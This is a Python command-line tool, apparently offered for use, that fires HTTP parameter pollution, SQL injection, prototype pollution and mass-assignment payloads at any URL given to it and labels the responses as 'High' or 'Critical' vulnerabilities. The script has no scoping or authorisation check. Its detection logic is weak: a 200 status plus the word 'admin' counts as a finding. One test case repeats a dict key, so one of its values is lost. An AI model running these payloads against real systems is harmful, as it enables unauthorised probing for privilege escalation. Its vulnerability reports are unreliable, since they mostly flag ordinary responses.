#!/usr/bin/env python3
"""
ADVANCED PARAMETER FUZZER - REAL VULNERABILITY DISCOVERY
Tests for parameter pollution, type confusion, and advanced injection techniques
"""
import requests
import urllib.parse
import json
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class AdvancedParameterFuzzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def fuzz_all_parameters(self):
        """Comprehensive parameter fuzzing"""
        print(f"[*] Starting advanced parameter fuzzing on {self.target_url}")
        
        # Test parameter pollution
        self.test_parameter_pollution()
        
        # Test type confusion
        self.test_type_confusion()
        
        # Test array/object injection
        self.test_array_object_injection()
        
        # Test prototype pollution
        self.test_prototype_pollution()
        
        # Test mass assignment
        self.test_mass_assignment()
        
        return self.vulnerabilities
    
    def test_parameter_pollution(self):
        """Test HTTP Parameter Pollution (HPP)"""
        print("[*] Testing parameter pollution...")
        
        test_cases = [
            # Duplicate parameters
            {"id": ["1", "2"]},
            {"user": ["admin", "guest"]},
            {"role": ["user", "admin"]},
            # Array notation
            {"id[]": "1", "id[]": "2"},
            {"user[0]": "admin", "user[1]": "guest"},
        ]
        
        for params in test_cases:
            try:
                # Test GET
                response = self.session.get(self.target_url, params=params, timeout=10)
                if self._check_hpp_vulnerability(response, params):
                    self.vulnerabilities.append({
                        "type": "HTTP Parameter Pollution",
                        "severity": "High",
                        "url": self.target_url,
                        "params": params,
                        "method": "GET"
                    })
                
                # Test POST
                response = self.session.post(self.target_url, data=params, timeout=10)
                if self._check_hpp_vulnerability(response, params):
                    self.vulnerabilities.append({
                        "type": "HTTP Parameter Pollution",
                        "severity": "High",
                        "url": self.target_url,
                        "params": params,
                        "method": "POST"
                    })
            except:
                pass
    
    def test_type_confusion(self):
        """Test type confusion vulnerabilities"""
        print("[*] Testing type confusion...")
        
        test_cases = [
            # String to int
            {"id": "1' OR '1'='1"},
            {"price": "-1"},
            {"quantity": "999999999"},
            # Array instead of string
            {"id": ["1", "2", "3"]},
            {"username": ["admin", "root"]},
            # Object instead of string
            {"user": {"role": "admin"}},
            {"settings": {"isAdmin": True}},
            # Boolean confusion
            {"admin": "true"},
            {"verified": "1"},
        ]
        
        for params in test_cases:
            try:
                response = self.session.post(self.target_url, json=params, timeout=10)
                if self._check_type_confusion(response, params):
                    self.vulnerabilities.append({
                        "type": "Type Confusion",
                        "severity": "High",
                        "url": self.target_url,
                        "params": params
                    })
            except:
                pass
    
    def test_array_object_injection(self):
        """Test array/object injection"""
        print("[*] Testing array/object injection...")
        
        test_cases = [
            # PHP array injection
            {"user[role]": "admin"},
            {"settings[isAdmin]": "true"},
            # JSON injection
            {"data": '{"role":"admin"}'},
            {"user": '{"isAdmin":true}'},
        ]
        
        for params in test_cases:
            try:
                response = self.session.post(self.target_url, data=params, timeout=10)
                if self._check_privilege_escalation(response):
                    self.vulnerabilities.append({
                        "type": "Array/Object Injection",
                        "severity": "Critical",
                        "url": self.target_url,
                        "params": params
                    })
            except:
                pass
    
    def test_prototype_pollution(self):
        """Test prototype pollution (JavaScript)"""
        print("[*] Testing prototype pollution...")
        
        test_cases = [
            {"__proto__[admin]": "true"},
            {"constructor[prototype][isAdmin]": "true"},
            {"__proto__.admin": "true"},
        ]
        
        for params in test_cases:
            try:
                response = self.session.post(self.target_url, json=params, timeout=10)
                if self._check_prototype_pollution(response):
                    self.vulnerabilities.append({
                        "type": "Prototype Pollution",
                        "severity": "Critical",
                        "url": self.target_url,
                        "params": params
                    })
            except:
                pass
    
    def test_mass_assignment(self):
        """Test mass assignment vulnerabilities"""
        print("[*] Testing mass assignment...")
        
        test_cases = [
            {"role": "admin", "isAdmin": "true"},
            {"permissions": "all", "admin": "1"},
            {"user_type": "admin", "verified": "true"},
        ]
        
        for params in test_cases:
            try:
                response = self.session.post(self.target_url, json=params, timeout=10)
                if self._check_privilege_escalation(response):
                    self.vulnerabilities.append({
                        "type": "Mass Assignment",
                        "severity": "High",
                        "url": self.target_url,
                        "params": params
                    })
            except:
                pass
    
    def _check_hpp_vulnerability(self, response, params):
        """Check for HPP vulnerability indicators"""
        indicators = [
            "admin" in response.text.lower(),
            "unauthorized" not in response.text.lower(),
            response.status_code == 200,
            "error" not in response.text.lower()
        ]
        return sum(indicators) >= 2
    
    def _check_type_confusion(self, response, params):
        """Check for type confusion indicators"""
        indicators = [
            response.status_code == 200,
            "admin" in response.text.lower(),
            "success" in response.text.lower(),
            len(response.text) > 100
        ]
        return sum(indicators) >= 2
    
    def _check_privilege_escalation(self, response):
        """Check for privilege escalation indicators"""
        indicators = [
            "admin" in response.text.lower(),
            "dashboard" in response.text.lower(),
            "privilege" in response.text.lower(),
            response.status_code == 200
        ]
        return sum(indicators) >= 2
    
    def _check_prototype_pollution(self, response):
        """Check for prototype pollution indicators"""
        indicators = [
            "admin" in response.text.lower(),
            response.status_code == 200,
            "true" in response.text.lower()
        ]
        return sum(indicators) >= 2

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 advanced_parameter_fuzzer.py <url>")
        sys.exit(1)
    
    fuzzer = AdvancedParameterFuzzer(sys.argv[1])
    vulns = fuzzer.fuzz_all_parameters()
    
    print(f"\n[+] Found {len(vulns)} potential vulnerabilities")
    for vuln in vulns:
        print(f"  - {vuln['type']}: {vuln['severity']}")

